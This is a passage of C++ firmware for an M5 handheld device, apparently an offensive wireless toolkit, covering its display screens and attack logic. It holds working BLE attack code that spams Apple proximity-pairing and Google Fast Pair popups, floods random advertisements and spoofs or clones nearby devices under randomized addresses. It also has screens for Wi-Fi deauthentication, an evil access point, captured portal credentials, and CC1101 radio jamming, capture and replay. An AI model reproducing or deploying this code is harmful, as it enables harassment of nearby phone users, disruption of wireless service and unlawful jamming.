      M5.Display.setTextColor(accent, kPanelAlt);
      M5.Display.setCursor(14, 90);
      M5.Display.printf("%.28s", g_portalCreds[g_portalCredCount - 1].c_str());
    }
  } else if (g_redWifiAttack == WifiAttackType::EvilAP) {
    M5.Display.setTextColor(kGold, kPanelAlt);
    M5.Display.setCursor(14, 62);
    M5.Display.printf("Clients: %d", WiFi.softAPgetStationNum());
    M5.Display.setTextColor(kDimText, kPanelAlt);
    M5.Display.setCursor(14, 76);
    M5.Display.printf("Time: %lus", elapsed);
  } else if (g_redWifiAttack == WifiAttackType::DeauthSweep) {
    M5.Display.setTextColor(kGold, kPanelAlt);
    M5.Display.setCursor(14, 62);
    M5.Display.printf("Frames: %d  CH:%d", g_redWifiAttackCount, g_redWifiDeauthChannel);
    M5.Display.setTextColor(kDimText, kPanelAlt);
    M5.Display.setCursor(14, 76);
    M5.Display.printf("Time: %lus", elapsed);
  } else {
    M5.Display.setTextColor(kGold, kPanelAlt);
    M5.Display.setCursor(14, 62);
    M5.Display.printf("Frames: %d", g_redWifiAttackCount);
    M5.Display.setTextColor(kDimText, kPanelAlt);
    M5.Display.setCursor(14, 76);
    M5.Display.printf("Time: %lus", elapsed);
  }

  M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println("Fn+Bk:stop attack");
}

void drawBleOpsListScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  const uint16_t soft = themeModeSoft(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setCursor(8, 8);
  M5.Display.println("Red BLE Ops");
  drawBatteryWidget(panel, 132);
  M5.Display.setTextColor(kDimText, panel);
  M5.Display.setCursor(174, 8);
  M5.Display.println("recon");

  M5.Display.fillRoundRect(8, 28, 224, 92, 3, kPanelAlt);
  M5.Display.drawRoundRect(8, 28, 224, 92, 3, accent);
  M5.Display.drawFastHLine(14, 34, 212, kGold);

  M5.Display.setTextColor(kGold, kPanelAlt);
  M5.Display.setCursor(14, 36);
  M5.Display.printf("DEV:%d", g_bleCount);
  M5.Display.setCursor(72, 36);
  M5.Display.printf("N:%d", g_bleNewCount);
  M5.Display.setCursor(108, 36);
  M5.Display.printf("C:%d", g_bleChangedCount);
  M5.Display.setCursor(144, 36);
  M5.Display.printf("S:%d", g_bleSpamCount);
  M5.Display.setCursor(184, 36);
  M5.Display.printf("%s", bleSortLabel());

  if (g_bleCount <= 0) {
    M5.Display.setTextColor(kText, kPanelAlt);
    M5.Display.setCursor(14, 54);
    M5.Display.println("No BLE devices  Fn+R scans");
  } else {
    M5.Display.setTextColor(accent, kPanelAlt);
    M5.Display.setCursor(14, 48);
    M5.Display.println("T NAME      RS RK");
    const int end = (g_redBleScroll + kBleVisibleRows < g_bleCount) ?
                    (g_redBleScroll + kBleVisibleRows) : g_bleCount;
    for (int i = g_redBleScroll; i < end; ++i) {
      const int row = i - g_redBleScroll;
      const int y = 58 + (row * 9);
      const char* nameStr = g_bleItems[i].name.length() ? g_bleItems[i].name.c_str() : "<anon>";
      if (i == g_redBleSelected) {
        M5.Display.fillRoundRect(12, y - 1, 216, 8, 2, accent);
        M5.Display.setTextColor(WHITE, accent);
      } else {
        M5.Display.setTextColor(kText, kPanelAlt);
      }
      char marker = '.';
      if (g_bleItems[i].trackerSuspect)              marker = 'T';
      else if (g_bleItems[i].roleHint == "mobile")   marker = 'M';
      else if (g_bleItems[i].roleHint == "wearable") marker = 'W';
      else if (g_bleItems[i].roleHint == "media")    marker = 'V';
      else if (g_bleItems[i].isNew)                  marker = '+';
      M5.Display.setCursor(14, y);
      M5.Display.printf("%c %-9.9s %3d %2d", marker, nameStr,
                        g_bleItems[i].rssi, g_bleItems[i].riskScore);
    }
    M5.Display.setTextColor(soft, kPanelAlt);
    M5.Display.setCursor(176, 48);
    M5.Display.printf("%d/%d", g_redBleSelected + 1, g_bleCount);
  }

  M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println("Ent:ops ;/.:move S:sort R:scan");
}

void drawBleOpsDetailScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  const BleScanItem& item = g_bleItems[g_redBleSelected];
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setCursor(8, 8);
  M5.Display.println("BLE Detail");
  drawBatteryWidget(panel, 132);

  M5.Display.fillRoundRect(8, 28, 224, 92, 3, kPanelAlt);
  M5.Display.drawRoundRect(8, 28, 224, 92, 3, accent);
  M5.Display.drawFastHLine(14, 34, 212, kGold);

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 36);
  M5.Display.println("Name");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(56, 36);
  M5.Display.printf("%.9s", item.name.length() ? item.name.c_str() : "<anon>");

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 50);
  M5.Display.println("Addr");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(56, 50);
  M5.Display.printf("%.17s", item.address.c_str());

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 64);
  M5.Display.println("RSSI");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(56, 64);
  M5.Display.printf("%d (%+d)", item.rssi, item.rssi - item.prevRssi);

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 78);
  M5.Display.println("Role");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(56, 78);
  M5.Display.printf("%.22s", item.roleHint.c_str());

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 92);
  M5.Display.println("Vend");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(56, 92);
  M5.Display.printf("%.22s", item.vendorHint.c_str());

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(116, 36);
  M5.Display.println("Tgt");
  M5.Display.setTextColor(kGold, kPanelAlt);
  M5.Display.setCursor(154, 36);
  if (item.trackerSuspect)               M5.Display.print("TRKR");
  else if (item.roleHint == "mobile")    M5.Display.print("MOBL");
  else if (item.roleHint == "wearable")  M5.Display.print("WEAR");
  else if (item.noName)                  M5.Display.print("ANON");
  else                                   M5.Display.print("GENR");

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(116, 50);
  M5.Display.println("Risk");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(154, 50);
  M5.Display.printf("%d", item.riskScore);

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(116, 64);
  M5.Display.println("Svc");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(154, 64);
  M5.Display.printf("%d/%d", item.serviceCount, item.manufacturerLen);

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(116, 78);
  M5.Display.println("Rand");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(154, 78);
  M5.Display.println(item.randomAddress ? "yes" : "no");

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(116, 92);
  M5.Display.println("Seen");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(154, 92);
  M5.Display.printf("%lu/%lu", static_cast<unsigned long>(item.firstSeenScan),
                    static_cast<unsigned long>(item.lastSeenScan));

  M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println("Ent list  Fn+Bk back");
}

void drawBleMainMenuScreen(TeamMode mode);
void drawBleActionMenuScreen(TeamMode mode);
void drawBleAttackScreen(TeamMode mode);

void drawBleOpsScreen(TeamMode mode) {
  switch (g_redBleState) {
    case BleOpsState::MainMenu:   drawBleMainMenuScreen(mode);   break;
    case BleOpsState::ActionMenu: drawBleActionMenuScreen(mode); break;
    case BleOpsState::Detail:     drawBleOpsDetailScreen(mode);  break;
    case BleOpsState::Attacking:  drawBleAttackScreen(mode);     break;
    default:                      drawBleOpsListScreen(mode);    break;
  }
}

// ─── BLE offensive attack engine ──────────────────────────────────────────

struct AppleDevice { const char* name; uint8_t model[2]; };
static const AppleDevice kAppleDevices[] = {
  {"AirPods Pro",    {0x0E, 0x20}},
  {"AirPods Pro 2",  {0x14, 0x20}},
  {"AirPods Gen3",   {0x13, 0x20}},
  {"AirPods Gen2",   {0x0F, 0x20}},
  {"AirPods Gen1",   {0x02, 0x20}},
  {"AirPods Max",    {0x0A, 0x20}},
  {"Beats Studio",   {0x11, 0x20}},
  {"Apple Watch",    {0x09, 0x20}},
};

struct AndroidDevice { const char* name; uint32_t modelId; };
static const AndroidDevice kAndroidDevices[] = {
  // Google Fast Pair (FE2C service data, 3-byte model ID big-endian)
  {"Pixel Buds Pro",   0x000048},
  {"Pixel Buds A",     0x000085},
  {"Pixel Buds",       0x92BBBD},
  {"Pixel Buds v2",    0x000006},
  {"Nothing Ear 1",    0x000046},
  {"Galaxy Buds2 Pro", 0x0066BA},
  {"Galaxy Buds Live", 0x002F00},
  {"JBL Flip 6",       0x821F66},
  {"JBL Buds Pro",     0xF52494},
  {"JBL Live 300TWS",  0x718FA4},
  {"Sony XM5",         0xD446A7},
  {"Bose NC 700",      0xCD8256},
  {"Bose QC35 II",     0x0000F0},
  {"Razer Hammerhead", 0x0E30C3},
  {"LG HBS-835S",      0x0003F0},
};
static constexpr int kAndroidDeviceCount =
    (int)(sizeof(kAndroidDevices) / sizeof(kAndroidDevices[0]));

// Samsung Galaxy Buds 2 Pro — company 0x0075 raw manufacturer payload
static const uint8_t kGalaxyBuds2ProAdv[] = {
  0x75, 0x00,  // company ID 0x0075
  0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x09, 0xAB, 0x0C,
  0x01, 0x46, 0x06, 0x3C, 0xDD, 0x0A, 0x00, 0x00, 0x00, 0x00, 0xA7, 0x00,
};
// Samsung notification popup — company 0x0006, format 030008 + ASCII
static const uint8_t kSamsungNotifyAdv[] = {
  0x06, 0x00,  // company ID 0x0006 (Samsung Electronics)
  0x03, 0x00, 0x08,
  'T', 'w', 'o', 'F', 'a', 'c', 'e',
};

struct SpoofDevice {
  const char* name;
  const char* advName;
  uint16_t appearance;
  const uint8_t* mfgData;
  uint8_t mfgLen;
};
static const SpoofDevice kSpoofDevices[] = {
  {"Galaxy Buds 2 Pro", nullptr,       0x0941, kGalaxyBuds2ProAdv, sizeof(kGalaxyBuds2ProAdv)},
  {"Samsung Notif",     nullptr,       0x0000, kSamsungNotifyAdv,  sizeof(kSamsungNotifyAdv)},
  {"Keyboard",          "BT Keyboard", 0x03C1, nullptr, 0},
  {"Mouse",             "BT Mouse",    0x03C2, nullptr, 0},
  {"Headphones",        "BT Headset",  0x0941, nullptr, 0},
  {"Speaker",           "BT Speaker",  0x0942, nullptr, 0},
};
static constexpr int kSpoofDeviceCount =
    (int)(sizeof(kSpoofDevices) / sizeof(kSpoofDevices[0]));

void bleEnsureInit() {
  if (!g_bleReady) {
    BLEDevice::init("");
    g_bleReady = true;
  }
}

void stopBleAttack() {
  if (g_redBleAdvertising) {
    BLEDevice::getAdvertising()->stop();
    g_redBleAdvertising = false;
  }
  g_redBleAttack = BleAttackType::None;
  g_redBleAttackCount = 0;
}

void spoofBleAddr() {
  esp_bd_addr_t rnd;
  for (int i = 0; i < 6; ++i) rnd[i] = (uint8_t)(esp_random() & 0xFF);
  rnd[5] |= 0xC0;
  esp_ble_gap_set_rand_addr(rnd);
}

void startBleAttack(BleAttackType type) {
  bleEnsureInit();
  BLEDevice::getScan()->stop();
  stopBleAttack();
  g_redBleAttack = type;
  g_redBleAttackCount = 0;
  const uint32_t now = millis();
  g_redBleAttackMs = now;
  g_redBleAttackStartMs = now;
  g_redBleState = BleOpsState::Attacking;

  if (type == BleAttackType::CloneSpam &&
      g_bleCount > 0 && g_redBleSelected < g_bleCount) {
    g_redBleAttackTarget =
        g_bleItems[g_redBleSelected].name.length()
            ? g_bleItems[g_redBleSelected].name
            : String(g_bleItems[g_redBleSelected].address);
  } else if (type == BleAttackType::DeviceSpoof) {
    g_redBleAttackTarget = kSpoofDevices[0].name;
  } else {
    g_redBleAttackTarget = "";
  }
}

void tickBleAttack() {
  if (g_redBleAttack == BleAttackType::None) return;

  const uint32_t now = millis();
  const uint32_t interval =
      (g_redBleAttack == BleAttackType::BleFlood) ? 60 : 220;
  if (now - g_redBleAttackMs < interval) return;
  g_redBleAttackMs = now;

  if (g_redBleAdvertising) {
    BLEDevice::getAdvertising()->stop();
    g_redBleAdvertising = false;
  }
  spoofBleAddr();

  BLEAdvertising* adv = BLEDevice::getAdvertising();
  BLEAdvertisementData advData;

  if (g_redBleAttack == BleAttackType::AppleSpam) {
    const AppleDevice& dev = kAppleDevices[g_redBleAttackCount %
        (int)(sizeof(kAppleDevices)/sizeof(kAppleDevices[0]))];
    g_redBleAttackTarget = dev.name;
    String mfg;
    mfg += (char)0x4C; mfg += (char)0x00;  // Apple company ID
    mfg += (char)0x07;                       // proximity pairing
    mfg += (char)0x19;                       // 25 bytes follow
    mfg += (char)dev.model[0];
    mfg += (char)dev.model[1];
    mfg += (char)0x20;
    mfg += (char)0x33;                       // pairing mode
    for (int i = 0; i < 21; ++i) mfg += (char)0x00;
    advData.setManufacturerData(std::string(mfg.c_str(), mfg.length()));

  } else if (g_redBleAttack == BleAttackType::AndroidSpam) {
    const AndroidDevice& dev = kAndroidDevices[g_redBleAttackCount % kAndroidDeviceCount];
    g_redBleAttackTarget = dev.name;
    std::string raw;
    raw += (char)6;
    raw += (char)0x16;  // service data type
    raw += (char)0x2C; raw += (char)0xFE;  // UUID 0xFE2C (Fast Pair)
    raw += (char)((dev.modelId >> 16) & 0xFF);
    raw += (char)((dev.modelId >> 8)  & 0xFF);
    raw += (char)(dev.modelId & 0xFF);
    advData.addData(raw);

  } else if (g_redBleAttack == BleAttackType::BleFlood) {
    String mfg;
    for (int i = 0; i < 26; ++i) mfg += (char)(esp_random() & 0xFF);
    advData.setManufacturerData(std::string(mfg.c_str(), mfg.length()));
    g_redBleAttackTarget = "flood";

  } else if (g_redBleAttack == BleAttackType::DeviceSpoof) {
    const SpoofDevice& dev = kSpoofDevices[g_redBleAttackCount % kSpoofDeviceCount];
    g_redBleAttackTarget = dev.name;
    if (dev.mfgData && dev.mfgLen > 0) {
      advData.setManufacturerData(std::string((const char*)dev.mfgData, dev.mfgLen));
    } else {
      if (dev.advName) advData.setName(dev.advName);
      if (dev.appearance) advData.setAppearance(dev.appearance);
    }

  } else if (g_redBleAttack == BleAttackType::CloneSpam &&
             g_bleCount > 0 && g_redBleSelected < g_bleCount) {
    const BleScanItem& tgt = g_bleItems[g_redBleSelected];
    if (tgt.name.length()) advData.setName(tgt.name.c_str());
    if (tgt.manufacturerLen > 0) {
      String mfg;
      for (int i = 0; i < tgt.manufacturerLen && i < 26; ++i)
        mfg += (char)(esp_random() & 0xFF);
      advData.setManufacturerData(std::string(mfg.c_str(), mfg.length()));
    }
  }

  adv->setAdvertisementData(advData);
  adv->start();
  g_redBleAdvertising = true;
  ++g_redBleAttackCount;
}

// ─── BLE Ops draw screens ──────────────────────────────────────────────────

static const char* kBleTopLabels[] = {
  "Scan & Target", "Apple Spam", "Android Spam", "BLE Flood", "Device Spoof"
};
static const char* kBleTopDesc[] = {
  "Pick device, attack",
  "AirPods/Watch spam",
  "Fast Pair spam",
  "Random adv flood",
  "Clone device adv",
};

static const char* kBleMenuLabels[] = { "Clone Spam", "Flood", "Detail" };
static const char* kBleMenuDesc[]   = {
  "Clone & spam",
  "Flood target",
  "View details",
};

void drawBleMainMenuScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setTextSize(1);
  M5.Display.setCursor(8, 8);
  M5.Display.println("Red BLE Ops");
  drawBatteryWidget(panel, 132);

  M5.Display.fillRoundRect(8, 28, 224, 92, 3, kPanelAlt);
  M5.Display.drawRoundRect(8, 28, 224, 92, 3, accent);
  M5.Display.drawFastHLine(14, 34, 212, kGold);

  for (int i = 0; i < 5; ++i) {
    const int y = 36 + (i * 14);
    if (i == g_redBleTopMenuSel) {
      M5.Display.fillRoundRect(12, y, 216, 12, 2, accent);
      M5.Display.setTextColor(WHITE, accent);
    } else {
      M5.Display.setTextColor(kText, kPanelAlt);
    }
    M5.Display.setCursor(16, y + 2);
    M5.Display.printf("%-14.14s %.21s", kBleTopLabels[i], kBleTopDesc[i]);
  }

  M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println("Ent:go  ;/.:pick  Fn+Bk");
}

void drawBleActionMenuScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setTextSize(1);
  M5.Display.setCursor(8, 8);
  M5.Display.println("BLE Attack Menu");
  drawBatteryWidget(panel, 132);

  M5.Display.fillRoundRect(8, 28, 224, 92, 3, kPanelAlt);
  M5.Display.drawRoundRect(8, 28, 224, 92, 3, accent);
  M5.Display.drawFastHLine(14, 34, 212, kGold);

  if (g_bleCount > 0 && g_redBleSelected < g_bleCount) {
    const BleScanItem& t = g_bleItems[g_redBleSelected];
    const char* n = t.name.length() ? t.name.c_str() : "<anon>";
    M5.Display.setTextColor(kDimText, kPanelAlt);
    M5.Display.setCursor(14, 36);
    M5.Display.printf(">> %-18.18s %ddBm", n, t.rssi);
  }

  for (int i = 0; i < 3; ++i) {
    const int y = 52 + (i * 18);
    if (i == g_redBleMenuSel) {
      M5.Display.fillRoundRect(12, y - 1, 216, 14, 2, accent);
      M5.Display.setTextColor(WHITE, accent);
    } else {
      M5.Display.setTextColor(kText, kPanelAlt);
    }
    M5.Display.setCursor(16, y + 2);
    M5.Display.printf("%-10.10s %.15s", kBleMenuLabels[i], kBleMenuDesc[i]);
  }

  M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println("Ent:go  ;/.:pick  Fn+Bk");
}

void drawBleAttackScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setTextSize(1);
  M5.Display.setCursor(8, 8);
  const char* atkName = "BLE ATTACK";
  switch (g_redBleAttack) {
    case BleAttackType::AppleSpam:   atkName = "APPLE SPAM";   break;
    case BleAttackType::AndroidSpam: atkName = "ANDROID SPAM"; break;
    case BleAttackType::BleFlood:    atkName = "BLE FLOOD";    break;
    case BleAttackType::DeviceSpoof: atkName = "DEVICE SPOOF"; break;
    case BleAttackType::CloneSpam:   atkName = "CLONE SPAM";   break;
    default: break;
  }
  M5.Display.println(atkName);
  drawBatteryWidget(panel, 132);

  M5.Display.fillRoundRect(8, 28, 224, 92, 3, kPanelAlt);
  M5.Display.drawRoundRect(8, 28, 224, 92, 3, accent);

  const int phase = (g_redBleAttackCount * 5) % 400;
  const int barW = phase <= 200 ? phase : 400 - phase;
  M5.Display.fillRect(14, 34, barW, 6, accent);

  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(14, 48);
  M5.Display.printf("Adv: %.24s", g_redBleAttackTarget.c_str());

  M5.Display.setTextColor(kGold, kPanelAlt);
  M5.Display.setCursor(14, 62);
  M5.Display.printf("Frames: %d", g_redBleAttackCount);

  M5.Display.setTextColor(kDimText, kPanelAlt);
  M5.Display.setCursor(14, 76);
  const uint32_t elapsed = (millis() - g_redBleAttackStartMs) / 1000;
  M5.Display.printf("Time:   %lus", elapsed);

  if (g_redBleAttack == BleAttackType::AppleSpam) {
    M5.Display.setTextColor(kDimText, kPanelAlt);
    M5.Display.setCursor(14, 90);
    M5.Display.printf("Device: %d/8", (g_redBleAttackCount % 8) + 1);
  } else if (g_redBleAttack == BleAttackType::AndroidSpam) {
    M5.Display.setTextColor(kDimText, kPanelAlt);
    M5.Display.setCursor(14, 90);
    M5.Display.printf("Model:  %d/5", (g_redBleAttackCount % 5) + 1);
  }

  M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println("Fn+Bk:stop attack");
}

// ─────────────── CC1101 Ops (Red team) ───────────────

static const char* kCc1101MenuItems[] = {
  "RX Monitor",
  "CW Jam",
  "Sweep Jam",
  "Capture Pkt",
  "SD Replay",
};

void drawCc1101OpsMenuScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  const auto& pins = hardwarePins();
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setTextSize(1);
  M5.Display.setCursor(8, 8);
  M5.Display.println("CC1101 Ops");
  drawBatteryWidget(panel, 132);
  M5.Display.setTextColor(kDimText, panel);
  M5.Display.setCursor(164, 8);
  M5.Display.printf("CS%d G%d", pins.cc1101Cs, pins.cc1101Gdo0);

  const bool hasHw = hardwareCurrentProfile() == HardwareProfile::RfHat;
  for (int i = 0; i < 5; ++i) {
    const int y   = 26 + i * 14;
    const bool sel = (i == g_redCc1101MenuSel);
    M5.Display.fillRect(8, y, 224, 13, sel ? kPanelAlt : themeModeBg(mode));
    M5.Display.setTextColor(sel ? accent : kText, sel ? kPanelAlt : themeModeBg(mode));
    M5.Display.setCursor(14, y + 2);
    M5.Display.print(sel ? "> " : "  ");
    M5.Display.print(kCc1101MenuItems[i]);
    if (i == 1) M5.Display.printf(" [%sMHz]", g_cc1101Bands[g_redCc1101BandIndex]);
    if (i == 2) M5.Display.printf(" [all]");
    if (i == 4) M5.Display.printf(" (%d files)", g_cc1101SdFileCount);
  }

  M5.Display.fillRect(8, 97, 224, 10, kPanelAlt);
  M5.Display.setTextColor(kDimText, kPanelAlt);
  M5.Display.setCursor(12, 99);
  M5.Display.printf("%s  Band: %sMHz", hasHw ? "RF HAT DETECTED" : "NO RF HAT", g_cc1101Bands[g_redCc1101BandIndex]);

  M5.Display.fillRect(8, 109, 224, 20, themeModeBg(mode));
  M5.Display.drawFastHLine(8, 109, 224, accent);
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 118);
  M5.Display.println("Fn+S=band  Ent=run  Fn+Bk=back");
}

void drawCc1101MonitorScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setTextSize(1);
  M5.Display.setCursor(8, 8);
  M5.Display.println("CC1101 RX MONITOR");
  drawBatteryWidget(panel, 132);

  M5.Display.fillRoundRect(8, 26, 224, 96, 3, kPanelAlt);
  M5.Display.drawRoundRect(8, 26, 224, 96, 3, accent);

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 32);
  M5.Display.printf("Band: %s MHz  Sens: %d",
    g_cc1101Bands[g_redCc1101BandIndex], g_cc1101Sensitivity);

  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(14, 46);
  M5.Display.printf("RSSI:  %d dBm", g_redCc1101MonProbe.rssiDbm);

  M5.Display.setCursor(14, 60);
  M5.Display.printf("GDO0:  %d   RxBytes: %d",
    g_redCc1101MonProbe.gdo0, g_redCc1101MonProbe.rxBytes);

  M5.Display.setTextColor(kDimText, kPanelAlt);
  M5.Display.setCursor(14, 74);
  M5.Display.printf("MARC:  %02X  LQI: %02X",
    g_redCc1101MonProbe.marcState, g_redCc1101MonProbe.lqi);

  M5.Display.setCursor(14, 88);
  M5.Display.printf("Part:  %02X  Ver: %02X  Scans: %d",
    g_redCc1101MonProbe.partnum, g_redCc1101MonProbe.version, g_redCc1101JamCount);

  const uint32_t elapsed = (millis() - g_redCc1101StartMs) / 1000;
  M5.Display.setCursor(14, 102);
  M5.Display.printf("%s  %lus",
    g_redCc1101MonProbe.present ? "CHIP OK" : "NO CHIP", elapsed);

  M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println("Fn+S=band  Ent=capture  Fn+Bk=back");
}

void drawCc1101JamScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setTextSize(1);
  M5.Display.setCursor(8, 8);
  M5.Display.println(g_redCc1101SweepMode ? "CC1101 SWEEP JAM" : "CC1101 CW JAM");
  drawBatteryWidget(panel, 132);

  M5.Display.fillRoundRect(8, 26, 224, 96, 3, kPanelAlt);
  M5.Display.drawRoundRect(8, 26, 224, 96, 3, accent);

  const int phase = (g_redCc1101JamCount * 7) % 400;
  const int barW = (phase <= 200 ? phase : 400 - phase) * 212 / 200;
  M5.Display.fillRect(14, 32, barW, 5, accent);

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 44);
  const char* band = g_redCc1101SweepMode
    ? g_cc1101Bands[g_redCc1101SweepBandIdx]
    : g_cc1101Bands[g_redCc1101BandIndex];
  M5.Display.printf("Band: %s MHz", band);

  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(14, 58);
  M5.Display.printf("TX Bursts:  %d", g_redCc1101JamCount);

  M5.Display.setTextColor(kDimText, kPanelAlt);
  M5.Display.setCursor(14, 72);
  const uint32_t elapsed = (millis() - g_redCc1101StartMs) / 1000;
  M5.Display.printf("Elapsed:    %lus", elapsed);

  M5.Display.setCursor(14, 86);
  M5.Display.printf("CS:%d GDO0:%d  Mode:TX",
    hardwarePins().cc1101Cs, hardwarePins().cc1101Gdo0);

  M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println("JAMMING...  Fn+Bk=stop");
}

void drawCc1101CaptureScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setTextSize(1);
  M5.Display.setCursor(8, 8);
  M5.Display.println(g_redCc1101HasCapture ? "CC1101 CAPTURED!" : "CC1101 CAPTURE");
  drawBatteryWidget(panel, 132);

  M5.Display.fillRoundRect(8, 26, 224, 96, 3, kPanelAlt);
  M5.Display.drawRoundRect(8, 26, 224, 96, 3, accent);

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 32);
  M5.Display.printf("Band: %s MHz", g_cc1101Bands[g_redCc1101BandIndex]);

  if (g_redCc1101HasCapture) {
    M5.Display.setTextColor(kGold, kPanelAlt);
    M5.Display.setCursor(14, 46);
    M5.Display.printf("Captured:  %d bytes", g_redCc1101Capture.len);

    M5.Display.setTextColor(kText, kPanelAlt);
    M5.Display.setCursor(14, 60);
    M5.Display.printf("RSSI: %ddBm  LQI: %d",
      g_redCc1101Capture.rssiDbm, g_redCc1101Capture.lqi);

    M5.Display.setCursor(14, 74);
    char hexbuf[28] = {};
    const int shown = g_redCc1101Capture.len < 8 ? g_redCc1101Capture.len : 8;
    int pos = 0;
    for (int i = 0; i < shown && pos < 27; ++i) {
      pos += snprintf(hexbuf + pos, sizeof(hexbuf) - pos, "%02X ", g_redCc1101Capture.data[i]);
    }
    M5.Display.printf("%.26s", hexbuf);

